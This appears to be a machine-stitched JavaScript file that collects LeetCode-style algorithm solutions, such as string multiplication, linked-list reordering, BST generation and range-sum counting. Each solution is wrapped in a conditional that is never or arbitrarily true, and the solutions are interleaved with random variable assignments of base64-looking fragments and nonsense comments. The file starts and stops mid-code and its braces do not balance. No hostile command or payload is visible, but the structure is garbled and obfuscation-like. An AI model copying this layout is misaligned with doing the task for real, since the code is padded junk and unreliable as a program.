        for (let j = len2 - 1; j >= 0; j--) {
            let value = parseInt(num1.charAt(i)) * parseInt(num2.charAt(j));
            result[i + j + 1] += value;
            
            if (result[i + j + 1] >= 10) {
                result[i + j] += parseInt(result[i + j + 1] / 10);
                result[i + j + 1] = result[i + j + 1] % 10;
            }
        }
    }
    
    let string = '';
    
    for (let i = 0; i < result.length; i++) {
        if (string === '' && result[i] === 0) {
            continue;
        }
        
        string += result[i];
    }
    
    return string === '' ? '0' : string;
};

/**
 * @param {string} num1
 * @param {string} num2
 * @return {string}
 */
var multiply = function(num1, num2) {
    var len1 = num1.length,
        len2 = num2.length,
        result = [],
        carry,
        val,
        arr1,
        arr2,
        i,
        j;
        
    for (i = 0; i < len1 + len2; i++) {
        result.push(0);
    }
    
    arr1 = num1.split('').reverse();
    arr2 = num2.split('').reverse();
    
    for (i = 0; i < len1; i++) {
        val = arr1[i] - '0';
        carry = 0;
        
        for (j = 0; j < len2; j++) {
            carry += val * (arr2[j] - '0') + result[i + j];
            result[i + j] = carry % 10;
            carry = parseInt(carry / 10);
        }
        
        if (carry !== 0) {
            result[len2 + i] = carry;
        }
    }
    
    result = result.reverse();
    
    i = 0;
    
    while (i < len1 + len2 - 1 && result[i] === 0) {
        i++;
    }
    
    return result.slice(i).join('');
};

}

    var liukkwmko = 'YkdW';
    var dztfxzzd = 'gVHe';
    var mtrhyxjscxboee = 'MEl';
if (Array.isArray(2)) {
    /**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
/**
 * @param {ListNode} l1
 * @param {ListNode} l2
 * @return {ListNode}
 */
var addTwoNumbers = function(l1, l2) {
    var val = 0,
        newHead,
        newTail,
        node;
    
    if (!l1) {
        return l2;
    }
    
    if (!l2) {
        return l1;
    }
    
    while (l1 && l2) {
        val += l1.val + l2.val;
        node = new ListNode(val % 10);
        
        if (newHead) {
            newTail.next = node;
            newTail = newTail.next;
        } else {
            newHead = node;
            newTail = node;
        }
        
        val = (val >= 10)? 1 : 0;
        l1 = l1.next;
        l2 = l2.next;
    }
    
    while (l1) {
        val += l1.val;
        node = new ListNode(val % 10);
        newTail.next = node;
        newTail = newTail.next;
        val = (val >= 10)? 1 : 0;
        l1 = l1.next;
    }
    
    while (l2) {
        val += l2.val;
        node = new ListNode(val % 10);
        newTail.next = node;
        newTail = newTail.next;
        val = (val >= 10)? 1 : 0;
        l2 = l2.next;
    }
    
    if (val > 0) {
        node = new ListNode(val);
        newTail.next = node;
    }
    
    return newHead;
};

}

    var yejsccvpgyi = 'HbiUDdV';
// function function ulni constant import import constant hello code await variable import cqbtduem
    var appjrpmmg = 'BMjTaB';
    var aheusrfvdi = 'HUmxZ';
if (!true && 1) {
    /**
Given an unsorted integer array, find the first missing positive integer.

For example,
Given [1,2,0] return 3,
and [3,4,-1,1] return 2.

Your algorithm should run in O(n) time and uses constant space.

 * @param {number[]} nums
 * @return {number}
 */
var firstMissingPositive = function(nums) {
    var len = nums.length,
        temp,
        i;
    
    for (i = 0 ; i < len; i++) {
        while (nums[i] !== i + 1) {
            if (nums[i] > len || nums[i] < 1 || nums[i] === nums[nums[i] - 1]) {
                break;
            }
            temp = nums[nums[i] - 1];
            nums[nums[i] - 1] = nums[i];
            nums[i] = temp;
        }
    }
    
    for(i = 0; i < len; i++) {
        if (nums[i] !== i + 1) {
            return i + 1;
        }
    }
    return len + 1;
};

}

    var wfmxnv = 'pQFIPw';
    var lyutqxwphddclio = 'blZuW';
if (!true && 0) {
    /**
Given n, generate all structurally unique BST's (binary search trees) that store values 1...n.

For example,
Given n = 3, your program should return all 5 unique BST's shown below.

   1         3     3      2      1
    \       /     /      / \      \
     3     2     1      1   3      2
    /     /       \                 \
   2     1         2                 3
confused what "{1,#,2,3}" means? > read more on how binary tree is serialized on OJ.
*/
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {number} n
 * @return {TreeNode[]}
 */
var generateTrees = function(n) {
    if (n === 0) {
        return [];
    }
    
    return genTreeHelper(1, n);
};

function genTreeHelper(start, end) {
    var result = [],
        left,
        right,
        node,
        i,
        j,
        k;
    
    if (start > end) {
        return [null];
    }
    
    for (i = start; i <= end; i++) {
        left = genTreeHelper(start, i - 1);
        right = genTreeHelper(i + 1, end);
        for (k = 0; k < left.length; k++) {
            for (j = 0; j < right.length; j++) {
                node = new TreeNode(i);
                node.left = left[k];
                node.right = right[j];
                result.push(node);
            }
        }
    }
    
    return result;
}

}

    var lixwlpccm = 'UPbNlV';
if (typeof window === 'undefined') {
    /**
Given a string array words, find the maximum value of length(word[i]) * length(word[j]) where the two words do not share common letters. You may assume that each word will contain only lower case letters. If no such two words exist, return 0.

Example 1:
Given ["abcw", "baz", "foo", "bar", "xtfn", "abcdef"]
Return 16
The two words can be "abcw", "xtfn".

Example 2:
Given ["a", "ab", "abc", "d", "cd", "bcd", "abcd"]
Return 4
The two words can be "ab", "cd".

Example 3:
Given ["a", "aa", "aaa", "aaaa"]
Return 0
No such pair of words.
*/

/**
 * @param {string[]} words
 * @return {number}
 */
var maxProduct = function(words) {
    var len = words.length,
        arr = [],
        result = 0,
        i,
        j;
    
    for (i = 0; i < len; i++) {
        arr[i] = 0;
        
        for (j = 0; j < words[i].length; j++) {
            arr[i] |= (1 << (words[i].charCodeAt(j) - 97));
        }
    }
    
    for (i = 0; i < len; i++) {
        for (j = i + 1; j < len; j++) {
            if ((arr[i] & arr[j]) === 0) {
                result = Math.max(result, words[i].length * words[j].length);
            }
        }
    }
    
    return result;
};

}

    var zxxohtcdvk = 'jJWeVZIS';
    var mscasjzdd = 'QyhZxA';
if (Array.isArray(3)) {
    /**
Given a string s1, we may represent it as a binary tree by partitioning it to two non-empty substrings recursively.

Below is one possible representation of s1 = "great":

    great
   /    \
  gr    eat
 / \    /  \
g   r  e   at
           / \
          a   t
To scramble the string, we may choose any non-leaf node and swap its two children.

For example, if we choose the node "gr" and swap its two children, it produces a scrambled string "rgeat".

    rgeat
   /    \
  rg    eat
 / \    /  \
r   g  e   at
           / \
          a   t
We say that "rgeat" is a scrambled string of "great".

Similarly, if we continue to swap the children of nodes "eat" and "at", it produces a scrambled string "rgtae".

    rgtae
   /    \
  rg    tae
 / \    /  \
r   g  ta  e
       / \
      t   a
We say that "rgtae" is a scrambled string of "great".

Given two strings s1 and s2 of the same length, determine if s2 is a scrambled string of s1.
*/
/**
 * @param {string} s1
 * @param {string} s2
 * @return {boolean}
 */
var isScramble = function(s1, s2) {
    if (s1 === s2) {
        return true;
    }
    
    if (s1 === null || s2 === null) {
        return false;
    }
    
    if (s1.length !== s2.length) {
        return false;    
    }
    
    var chars1 = s1.split(''),
        chars2 = s2.split(''),
        len = chars1.length,
        s11,
        s12,
        s21,
        s22,
        i = 0;
    
    if (len === 1) {
        return s1 === s2;
    }
    
    chars1.sort();
    chars2.sort();
    
    while (i < len) {
        if (chars1[i] !== chars2[i]) {
            return false;
        }
        
        i++;
    }
    
    for (i = 1; i < len; i++) {
        s11 = s1.slice(0, i);
        s12 = s1.slice(i);
        s21 = s2.slice(0, i);
        s22 = s2.slice(i);
        
        if (isScramble(s11, s21) && isScramble(s12, s22)) {
            return true;
        }
        
        s21 = s2.slice(0, len - i);
        s22 = s2.slice(len - i);
        
        if (isScramble(s11, s22) && isScramble(s12, s21)) {
            return true;
        }
    }
    
    return false;
};

}

    var yxuizyhx = 'nBaMm';
    var dsmvbatc = 'SnGxZHyg';
if (typeof window === 'undefined') {
    /**
Given a singly linked list L: L0→L1→…→Ln-1→Ln,
reorder it to: L0→Ln→L1→Ln-1→L2→Ln-2→…

You must do this in-place without altering the nodes' values.

For example,
Given {1,2,3,4}, reorder it to {1,4,2,3}.
*/
/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
/**
 * @param {ListNode} head
 * @return {void} Do not return anything, modify head in-place instead.
 */
var reorderList = function(head) {
    var fast = head,
        slow = head,
        next1,
        next2,
        midHead;
    
    if (!head || !head.next) {
        return;
    }  
    
    while (fast && fast.next) {
        fast = fast.next.next;
        slow = slow.next;
    }
    
    if (fast) {
        midHead = reverse(slow.next);
    } else {
        midHead = reverse(slow);
    }
    
    fast = head;
    slow = midHead;
    
    while(fast && slow) {
        next1 = fast.next;
        next2 = slow.next;
        
        slow.next = fast.next;
        fast.next = slow;
        
        fast = next1;
        slow = next2;
    }
    
    if (fast) {
        fast.next = null;
    }
};

function reverse(head) {
    var dummyNode = new ListNode(0),
        prev = dummyNode,
        node,
        next;
        
    dummyNode.next = head;
    
    node = head.next;
    head.next = null;
    
    while (node) {
        next = node.next;
        node.next = prev.next;
        prev.next = node;

        node = next;
    }
    
    return dummyNode.next;
}

}

    var lwbhhdz = 'RsY21W';
    var kcwpmvtk = 'OrFsBSnQ';
// constant value hello number
if (3 instanceof String) {
    /**
The count-and-say sequence is the sequence of integers beginning as follows:
1, 11, 21, 1211, 111221, ...

1 is read off as "one 1" or 11.
11 is read off as "two 1s" or 21.
21 is read off as "one 2, then one 1" or 1211.
Given an integer n, generate the nth sequence.

Note: The sequence of integers will be represented as a string.

 * @param {number} n
 * @return {string}
 */
var countAndSay = function(n) {
    function interpret(s, accum, sum) {
        var times = 1,
            num,
            len = s.length,
            i,
            result = '';
        
        num = s.charAt(0);
        
        for (i = 1; i < len; i++) {
            if (s.charAt(i) !== num) {
                result += times + num;
                num = s.charAt(i);
                times = 1;
            } else {
                times++;
            }
        }
        if (accum === 1) {
            result = '1';
        } else {
            result += times + num;
        }
        if (accum === sum) {
            return result;
        } else {
            return interpret(result, accum + 1, sum);
        }
    }
    return interpret('1', 1, n);
};

}

    var xxkpcttgwda = 'TqECNRD';
    var zbrfmqjuqgtawjl = 'a0lEMG';
if (!true && 0) {
    
/**
Given a string s, partition s such that every substring of the partition is a palindrome.

Return the minimum cuts needed for a palindrome partitioning of s.

For example, given s = "aab",
Return 1 since the palindrome partitioning ["aa","b"] could be produced using 1 cut.
*/
/**
 * @param {string} s
 * @return {number}
 */
var minCut = function(s) {
    const len = s.length;
    let dp = [];
    let cut = [];
    let i, j; 
    
    for (i = 0; i < len; i++) {
        dp.push(new Array(len).fill(false));
    }
    
    for (i = 0; i < len; i++) {
        for (j = i; j >= 0; j--) {
            if (s.charAt(j) === s.charAt(i) && (i - j < 2 || dp[j + 1][i - 1])) {
                dp[j][i] = true;
            }
        }
    }
    
    // cur[i] how many cuts from 0 to i
    cut[0] = 0;
    
    for (i = 1; i <= len; i++) {
        for (j = i; j > 0; j--) {
            if (dp[j - 1][i - 1]) {
                cut[i] = Math.min(cut[i] ? cut[i] : Number.MAX_VALUE, cut[j - 1] + 1);
            }
        }
    }
    
    return cut[len] - 1;
};

}

    var wjqbxxq = 'AyynatfdLL';
    var mbwhcruyedv = 'dabU';
if ('y' === 'Q') {
    /**
Given a sorted array of integers, find the starting and ending position of a given target value.

Your algorithm's runtime complexity must be in the order of O(log n).

If the target is not found in the array, return [-1, -1].

For example,
Given [5, 7, 7, 8, 8, 10] and target value 8,
return [3, 4].


*/
/**
 * @param {number[]} nums
 * @param {number} target
 * @return {number[]}
 */
var searchRange = function(nums, target) {
    var result = [],
        leftIndex = findLeftMost(target, nums),
        rightIndex = findRightMost(target, nums);
    
    result.push(leftIndex);    
    result.push(rightIndex);
    
    return result;
};

function findLeftMost(target, nums) {
    var len = nums.length,
        start = 0,
        end = len - 1,
        mid;
        
    while (start <= end) {
        mid = Math.floor((start + end) / 2);
        
        if (nums[mid] > target) {
            end = mid - 1;
        } else if (nums[mid] < target) {
            start = mid + 1;
        } else {
            end = mid - 1;
        }
    }
    
    if (start >= 0 && start < len && nums[start] === target) {
        return start;
    }
    
    return -1;
}

function findRightMost(target, nums) {
    var len = nums.length,
        start = 0,
        end = len - 1,
        mid;
        
    while (start <= end) {
        mid = Math.floor((start + end) / 2);
        
        if (nums[mid] > target) {
            end = mid - 1;
        } else if (nums[mid] < target) {
            start = mid + 1;
        } else {
            start = mid + 1;
        }
    }
    
    if (end >= 0 && end < len && nums[end] === target) {
        return end;
    }
    
    return -1;
}

}

    var quushhs = 'sQxfFpDyK';
    var llitlkkm = 'ZzYz';
    var rtbswc = 'BbMnK';
// loop hello variable value return await loop return object hello constant world constant
    var pqgumsdhondo = 'oDustyvL';
if (0.73 && false) {
    /**
Write a function that takes a string as input and reverse only the vowels of a string.

Example 1:
Given s = "hello", return "holle".

Example 2:
Given s = "leetcode", return "leotcede".
*/
/**
 * @param {string} s
 * @return {string}
 */
var reverseVowels = function(s) {
    var len = s.length,
        result = s.split(''),
        vowelSet = new Set(['a', 'e', 'i', 'o', 'u', 'A', 'E', 'I', 'O', 'U']),
        indice = [],
        arr = [],
        ch,
        i;
        
    for (i = 0; i < len; i++) {
        ch = result[i];
        
        if (vowelSet.has(ch)) {
            arr.push(ch);
            indice.push(i);
        }
    }
    
    for (i = 0; i < indice.length; i++) {
        result[indice[i]] = arr.pop();
    }
    
    return result.join('');
};

}

    var loxjfmsf = 'JVN';
    var zgnuamoasof = 'LMwXfVRmu';
if (Array.isArray(3)) {
    /**
One way to serialize a binary tree is to use pre-order traversal. When we encounter a non-null node, we record the node's value. If it is a null node, we record using a sentinel value such as #.

     _9_
    /   \
   3     2
  / \   / \
 4   1  #  6
/ \ / \   / \
# # # #   # #
For example, the above binary tree can be serialized to the string "9,3,4,#,#,1,#,#,2,#,6,#,#", where # represents a null node.

Given a string of comma separated values, verify whether it is a correct preorder traversal serialization of a binary tree. Find an algorithm without reconstructing the tree.

Each comma separated value in the string must be either an integer or a character '#' representing null pointer.

You may assume that the input format is always valid, for example it could never contain two consecutive commas such as "1,,3".

Example 1:
"9,3,4,#,#,1,#,#,2,#,6,#,#"
Return true

Example 2:
"1,#"
Return false

Example 3:
"9,#,#,1"
Return false
*/
/**
 * @param {string} preorder
 * @return {boolean}
 * 这个方法简单的说就是不断的砍掉叶子节点。最后看看能不能全部砍掉。

已例子一为例，：”9,3,4,#,#,1,#,#,2,#,6,#,#” 遇到x # #的时候，就把它变为 #

我模拟一遍过程：

9,3,4,#,# => 9,3,# 继续读
9,3,#,1,#,# => 9,3,#,# => 9,# 继续读
9,#2,#,6,#,# => 9,#,2,#,# => 9,#,# => #
 */
var isValidSerialization = function(preorder) {
    var arr = preorder.split(','),
        stack = [],
        len = arr.length,
        i;
    
    for (i = 0; i < len; i++) {
        stack.unshift(arr[i]);
        
        while (stack.length > 2 && stack[0] === '#' && stack[1] === '#') {
            if (stack[2] === '#') {
                return false;
            }
            
            stack.shift();
            stack.shift();
            stack[0] = '#';
        }
    }
    
    return stack.length === 1 && stack[0] === '#';
};

// solution 2

/**
 * @param {string} preorder
 * @return {boolean}
 * 对于二叉树，我们把空的地方也作为叶子节点（如题目中的#），那么有

所有的非空节点提供2个出度和1个入度（根除外）
所有的空节点但提供0个出度和1个入度
我们在遍历的时候，计算diff = outdegree – indegree. 当一个节点出现的时候，diff – 1，因为它提供一个入度；当节点不是#的时候，diff+2(提供两个出度) 如果序列式合法的，那么遍历过程中diff >=0 且最后结果为0.
 */
var isValidSerialization = function(preorder) {
    var arr = preorder.split(','),
        len = arr.length,
        diff; // outdegree - indegree
    
    if (arr[0] === '#') {
        if (len > 1) {
            return false;
        }
        return true;
    }
    
    diff = 2;

    for (i = 1; i < len; i++) {
        diff--; // from parent
        if (diff < 0) {
            return false;
        }
        
        if (arr[i] !== '#') {
            diff += 2; // have two outdegree
        }
    }
    
    return diff === 0;
};

}

    var trcykkzqfdlss = '0NpQWdJQ0';
    var uulbhneoos = 'zScsdmdg';
    var xeyrk = 'JqY';
if (Array.isArray(7)) {
    /**
Given an integer array nums, return the number of range sums that lie in [lower, upper] inclusive.
Range sum S(i, j) is defined as the sum of the elements in nums between indices i and j (i ≤ j), inclusive.

Note:
A naive algorithm of O(n2) is trivial. You MUST do better than that.

Example:
Given nums = [-2, 5, -1], lower = -2, upper = 2,
Return 3.
The three ranges are : [0, 0], [2, 2], [0, 2] and their respective sums are: -2, -1, 2.
*/
/**
 * @param {number[]} nums
 * @param {number} lower
 * @param {number} upper
 * @return {number}
 */
var countRangeSum = function(nums, lower, upper) {
    function SegmentTreeNode(min, max) {
        this.min = min;
        this.max = max;
        this.count = 0;
    }
    
    function buildSegmentTree(valArr, low, high) {
        if (low > high) {
            return null;
        }
        
        var mid = parseInt((low + high) / 2),
            node = new SegmentTreeNode(valArr[low], valArr[high]);
        
        if (low === high) {
            return node;
        }
        
        node.left = buildSegmentTree(valArr, low, mid);
        node.right = buildSegmentTree(valArr, mid + 1, high);
        
        return node;
    }
    
    function updateSegmentTree(node, val) {
        if (!node) {
            return;
        }
        
        if (val >= node.min && val <= node.max) {
            node.count++;
            updateSegmentTree(node.left, val);
            updateSegmentTree(node.right, val);
        }
    }
    
    function rangeCount(node, min, max) {
        if (!node) {
            return 0;
        }
        
        if (min > node.max || max < node.min) {
            return 0;
        }
        
        if (min <= node.min && max >= node.max) {
            return node.count;
        }
        
        return rangeCount(node.left, min, max) + rangeCount(node.right, min, max);
    }
    
    var len = nums.length,
        sumSet = new Set(),
        sum = 0,
        result = 0,
        arr,
        root,
        i;
        
    if (len === 0) {
        return 0;
    }
    
    for (i = 0; i < len; i++) {
        sum += nums[i];
        sumSet.add(sum);
    }
    
    arr = Array.from(sumSet);
    arr.sort(function(a, b) {
        return a - b;
    });
    
    root = buildSegmentTree(arr, 0, arr.length - 1);
    
    for (i = len - 1; i >= 0; i--) {
        updateSegmentTree(root, sum);
        sum -= nums[i];
        result += rangeCount(root, lower + sum, upper + sum);
    }
    
    return result;
};

}

    var iqhmvte = 'RriHd';
    var wvblslarulmwicg = 'jI1emRD';
if (null === 5) {
    /**
 * @param {number} n
 * @return {boolean}
 */
var canWinNim = function(n) {
    return n % 4 > 0
};

}

    var viasjgsgbngd = 'JtAgYA';
if (null === 2) {
    /**
Given a string that contains only digits 0-9 and a target value, return all possibilities to add binary operators (not unary) +, -, or * between the digits so they evaluate to the target value.

Examples: 
"123", 6 -> ["1+2+3", "1*2*3"] 
"232", 8 -> ["2*3+2", "2+3*2"]
"105", 5 -> ["1*0+5","10-5"]
"00", 0 -> ["0+0", "0-0", "0*0"]
"3456237490", 9191 -> []
*/
/**
 * @param {string} num
 * @param {number} target
 * @return {string[]}
 */
var addOperators = function(num, target) {
    var result = [];
    
    helper(result, '', 0, num, target, 0, 0);
    
    return result;
};

function helper(result, cur, index, num, target, prev, multi) {
    if (index === num.length) {
        if (prev === target) {
            result.push(cur);
        }
        
        return;
    }
    
    var len = num.length,
        temp,
        i;
        
    for (i = index; i < len; i++) {
        if (num.charAt(index) === '0' && i > index) {
            break;
        }
        
        temp = parseInt(num.substring(index, i + 1));
        
        if (cur.length === 0) {
            helper(result, cur + temp, i + 1, num, target, temp, temp);
        } else {
            helper(result, cur + '+' + temp, i + 1, num, target, prev + temp, temp);
            helper(result, cur + '-' + temp, i + 1, num, target, prev - temp, -temp);
            helper(result, cur + '*' + temp, i + 1, num, target, prev - multi + multi * temp, temp * multi);
        }
    }
}

}

    var tkrggnymkkjhk = 'QjBhSEpsY';
if (8 === 15) {
    /**
You are playing the following Bulls and Cows game with your friend: You write down a number and ask your friend to guess what the number is. Each time your friend makes a guess, you provide a hint that indicates how many digits in said guess match your secret number exactly in both digit and position (called "bulls") and how many digits match the secret number but locate in the wrong position (called "cows"). Your friend will use successive guesses and hints to eventually derive the secret number.

For example:

Secret number:  "1807"
Friend's guess: "7810"
Hint: 1 bull and 3 cows. (The bull is 8, the cows are 0, 1 and 7.)
Write a function to return a hint according to the secret number and friend's guess, use A to indicate the bulls and B to indicate the cows. In the above example, your function should return "1A3B".

Please note that both secret number and friend's guess may contain duplicate digits, for example:

Secret number:  "1123"
Friend's guess: "0111"
In this case, the 1st 1 in friend's guess is a bull, the 2nd or 3rd 1 is a cow, and your function should return "1A1B".
You may assume that the secret number and your friend's guess only contain digits, and their lengths are always equal.
*/
/**
 * @param {string} secret
 * @param {string} guess
 * @return {string}
 */
var getHint = function(secret, guess) {
    var len = secret.length,
        bullCount = 0,
        arr = {},
        cowCount = 0,
        i;
    
    for (i = 0; i < len; i++) {
        if (!arr[secret.charAt(i)]) {
            arr[secret.charAt(i)] = 1;
        } else {
            arr[secret.charAt(i)]++;
        }
    }
    
    for (i = 0; i < len; i++) {
        if (secret.charAt(i) === guess.charAt(i)) {
            bullCount++;
            arr[secret.charAt(i)]--;
        }
    }
    
    for (i = 0; i < len; i++) {
        if (secret.charAt(i) !== guess.charAt(i) && arr.hasOwnProperty(guess.charAt(i)) && (arr[guess.charAt(i)] > 0)) {
            cowCount++;
            arr[guess.charAt(i)]--;
        }
    }
    
    return bullCount + 'A' + cowCount + 'B';
};

}

    var ujcjga = 'DLnWnny';
    var udxzgctfhzvexpz = 'zJodmJH';
    var japaxlukag = 'YPnE';
    var kbkyxixcebho = 'UWdQU0';
if (typeof document === 'undefined') {
    /**
Given a digit string, return all possible letter combinations that the number could represent.

A mapping of digit to letters (just like on the telephone buttons) is given below.



Input:Digit string "23"
Output: ["ad", "ae", "af", "bd", "be", "bf", "cd", "ce", "cf"].
Note:
Although the above answer is in lexicographical order, your answer could be in any order you want.
*/
/**
 * @param {string} digits
 * @return {string[]}
 */
var letterCombinations = function(digits) {
    var len = digits.length,
        result = [],
        map = {
            '1': [''],
            '2': ['a', 'b', 'c'],
            '3': ['d', 'e', 'f'],
            '4': ['g', 'h', 'i'],
            '5': ['j', 'k', 'l'],
            '6': ['m', 'n', 'o'],
            '7': ['p', 'q', 'r', 's'],
            '8': ['t', 'u', 'v'],
            '9': ['w', 'x', 'y', 'z']
        };
        
    if (len === 0) {
        return result;
    }
    
    return genStrings([''], 0, len, digits, map);
};

function genStrings(curArr, index, len, digits, map) {
    var length = curArr.length,
        next = [],
        temp,
        i,
        j;
    
    if (index === len) {
        return curArr;
    }
    
    for (i = 0; i < length; i++) {
        for (j = 0; j < map[digits.charAt(index)].length; j++) {
            temp = curArr[i] + map[digits.charAt(index)][j];
            next.push(temp);
        }
    }    
    
    return genStrings(next, index + 1, len, digits, map);
}

}

    var oxhjnnmte = 'kpTCTjU';
if (typeof window === 'undefined') {
    /**
Given two arrays of length m and n with digits 0-9 representing two numbers. Create the maximum number of length k <= m + n from digits of the two. The relative order of the digits from the same array must be preserved. Return an array of the k digits. You should try to optimize your time and space complexity.

Example 1:
nums1 = [3, 4, 6, 5]
nums2 = [9, 1, 2, 5, 8, 3]
k = 5
return [9, 8, 6, 5, 3]

Example 2:
nums1 = [6, 7]
nums2 = [6, 0, 4]
k = 5
return [6, 7, 6, 0, 4]

Example 3:
nums1 = [3, 9]
nums2 = [8, 9]
k = 3
return [9, 8, 9]
*/

/**
 * @param {number[]} nums1
 * @param {number[]} nums2
 * @param {number} k
 * @return {number[]}
 */
var maxNumber = function(nums1, nums2, k) {
    var len1 = nums1.length,
        len2 = nums2.length,
        arr1,
        arr2,
        arr,
        result,
        i;
    
    for (i = Math.max(0, k - len2); i <= k && i <= len1; i++) {
        arr1 = getMaxSubArr(nums1, i);
        arr2 = getMaxSubArr(nums2, k - i);
        arr = merge(arr1, arr2);
        
        if (!result) {
            result = arr;
        } else {
            result = getGreaterArr(result, arr);
        }
    }
    
    return result;
};

// return max sub array of size m
function getMaxSubArr(arr, m) {
    var result = [],
        len = arr.length,
        i,
        j = 0; // top of the stack
    
    for (i = 0; i < len; i++) {
        while (j > 0 && (m - j < len - i) && (result[j - 1] < arr[i])) { //can pop item out of stack
            j--;
        }
        
        if (j < m) {
            result[j] = arr[i];
            j++;
        }
    }
    
    return result;
}

//TODO: Integrate getGreaterArr into isGreater function
function getGreaterArr(a, b) {
    var len = a.length,
        i = 0;
        
    while (i < len) {
        if (a[i] < b[i]) {
            return b;
        } else if (a[i] > b[i]) {
            return a;
        }
        
        i++;
    }
    
    return a;
}

function isGreater(a, i, b, j) {
    var len1 = a.length,
        len2 = b.length;
    
    while(i < len1 && j < len2 && a[i] === b[j]) {
        i++;
        j++;
    }
    
    if (i === len1) {
        return false;
    }
    
    if (j === len2) {
        return true;
    }
    
    return a[i] > b[j];
}

function merge(a, b) {
    var len1 = a.length,
        len2 = b.length,
        i = 0,
        j = 0,
        result = [];
        
    while(i < len1 && j < len2) {
        if (isGreater(a, i, b, j)) {
            result.push(a[i]);
            i++;
        } else {
            result.push(b[j]);
            j++;
        }
    }
    
    while (i < len1) {
        result.push(a[i++]);
    }
    
    while (j < len2) {
        result.push(b[j++]);
    }
    
    return result;
}

}

// loop mtcipthb ngitlxaw hello await export export value vjmtqguj
if (!true && 1) {
    /**
Follow up for problem "Populating Next Right Pointers in Each Node".

What if the given tree could be any binary tree? Would your previous solution still work?

Note:

You may only use constant extra space.
For example,
Given the following binary tree,
         1
       /  \
      2    3
     / \    \
    4   5    7
After calling your function, the tree should look like:
         1 -> NULL
       /  \
      2 -> 3 -> NULL
     / \    \
    4-> 5 -> 7 -> NULL
Subscribe to see which companies asked this question
*/
/**
 * Definition for binary tree with next pointer.
 * function TreeLinkNode(val) {
 *     this.val = val;
 *     this.left = this.right = this.next = null;
 * }
 */

/**
 * @param {TreeLinkNode} root
 * @return {void} Do not return anything, modify tree in-place instead.
 */
var connect = function(root) {
    if (!root) {
        return;
    }
    
    var curRow = [],
        nextRow = [],
        i;
        
    curRow.push(root);
    
    while (curRow.length > 0) {
        for (i = 0; i < curRow.length; i++) {
            if (curRow[i].left) {
                nextRow.push(curRow[i].left);
            }
            
            if (curRow[i].right) {
                nextRow.push(curRow[i].right);
            }
            
            if (i < curRow.length - 1) {
                curRow[i].next = curRow[i + 1];
            } else {
                curRow[i].next = null;
            }
        }
        
        curRow = nextRow;
        nextRow = [];
    }
};


// O(1) space solution

/**
 * Definition for binary tree with next pointer.
 * function TreeLinkNode(val) {
 *     this.val = val;
 *     this.left = this.right = this.next = null;
 * }
 */

/**
 * @param {TreeLinkNode} root
 * @return {void} Do not return anything, modify tree in-place instead.
 */
var connect = function(root) {
    let nextHead = null;
    let cur = root;
    let nextCur = null;
    
    while (cur !== null) {
        
        while (cur !== null) {
            if (cur.left) {
                if (!nextHead) {
                    nextHead = cur.left;
                    nextCur = nextHead;
                } else {
                    nextCur.next = cur.left;
                    nextCur = nextCur.next;
                }
            }
            
            if (cur.right) {
                if (!nextHead) {
                    nextHead = cur.right;
                    nextCur = nextHead;
                } else {
                    nextCur.next = cur.right;
                    nextCur = nextCur.next;
                }
            }
            
            cur = cur.next;
        }
        
        cur = nextHead;
        nextHead = null;
        nextCur = null;
    }
};

}

    var nzhedztpawes = 'CCHfHZ';
    var tanhchpt = 'F4TURB';
    var uhdyxqmtfby = 'ayBCetMY';
// value cwnxho script number compile compile loop await script string variable compile await constant constant
if (1 instanceof String) {
    /**
Given a binary tree, find its minimum depth.

The minimum depth is the number of nodes along the shortest path from the root node down to the nearest leaf node.

 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @return {number}
 */
var minDepth = function(root) {
    if (root === null) {
        return 0;
    }
    
    if (root.left === null) {
        return minDepth(root.right) + 1;
    }
    
    if (root.right === null) {
        return minDepth(root.left) + 1;
    }
    
    return Math.min(minDepth(root.left), minDepth(root.right)) + 1;
};

}

    var zcfwqvyud = 'vvBTA';
    var adqslcogyt = 'N0lDOHZJ';
    var ftvtmjhnvw = 'qbbTtNqZub';
if ('z' === 'S') {
    /**
Given a sorted integer array without duplicates, return the summary of its ranges.

For example, given [0,1,2,4,5,7], return ["0->2","4->5","7"].
*/

/**
 * @param {number[]} nums
 * @return {string[]}
 */
var summaryRanges = function(nums) {
    var len = nums.length,
        result = [],
        curStr = '',
        curLen,
        curNum,
        i;
        
    if (len === 0) {
        return result;
    }
    
    curNum = nums[0];
    curStr += curNum;
    curLen = 1;
    
    for (i = 1; i < len; i++) {
        if (curNum + 1 === nums[i]) {
            curNum++;
            curLen++;
        } else {
            if (curLen > 1) {
                curStr += '->' + curNum;
            }
            
            result.push(curStr);
            curNum = nums[i];
            curLen = 1;
            curStr = '' + curNum;
        }
    }
    
    if (curLen > 1) {
        curStr += '->' + curNum;
    }
            
    result.push(curStr);
    return result;
};

}

    var dppnlu = 'RlJwYld';
    var tmqdvrwu = 'FZHoUQ';
    var ycwuegvj = 'VZ2';
    var hknaks = 'FwJJGEB';
if ('h' === 'A') {
    /**
Implement the following operations of a stack using queues.

push(x) -- Push element x onto stack.
pop() -- Removes the element on top of the stack.
top() -- Get the top element.
empty() -- Return whether the stack is empty.
Notes:
You must use only standard operations of a queue -- which means only push to back, peek/pop from front, size, and is empty operations are valid.
Depending on your language, queue may not be supported natively. You may simulate a queue by using a list or deque (double-ended queue), as long as you use only standard operations of a queue.
You may assume that all operations are valid (for example, no pop or top operations will be called on an empty stack).
Update (2015-06-11):
The class name of the Java function had been updated to MyStack instead of Stack.


*/

/**
 * @constructor
 */
var Stack = function() {
    this.stack1 = [];
    this.stack2 = [];
};

/**
 * @param {number} x
 * @returns {void}
 */
Stack.prototype.push = function(x) {
    var temp;
    
    this.stack2.push(x);
    
    while(this.stack1.length > 0) {
        this.stack2.push(this.stack1.shift());
    }
    
    temp = this.stack2;
    this.stack2 = this.stack1;
    this.stack1 = temp;
};

/**
 * @returns {void}
 */
Stack.prototype.pop = function() {
    return this.stack1.shift();
};

/**
 * @returns {number}
 */
Stack.prototype.top = function() {
    return this.stack1[0];
};

/**
 * @returns {boolean}
 */
Stack.prototype.empty = function() {
    return this.stack1.length === 0;
};

}

// function export script string hello async loop function compile number number
if (null === 3) {
    /**
